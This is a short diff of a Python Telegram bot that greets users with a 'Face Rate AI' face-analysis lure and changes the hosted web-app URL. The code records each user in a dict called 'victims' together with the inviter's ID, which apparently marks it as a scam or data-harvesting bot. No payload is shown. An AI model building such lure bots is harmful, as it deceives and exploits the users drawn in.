@@ -52,7 +52,7 @@ def start_message(message):
             victims[message.from_user.id] = inviter_id
             
             # ВСТАВЬ СЮДА СВОЮ ССЫЛКУ С RENDER (например, https://face-bot-xxxx.onrender.com)
-            web_app_url = "https://face-bot-l1us.onrender.com" 
+            web_app_url = "https://face-bot-1-p8zh.onrender.com" 
             
             text = "🤖 **Добро пожаловать в Face Rate AI!**\n\nНажми на кнопку ниже, чтобы открыть приложение и пройти анализ."
             markup = InlineKeyboardMarkup()
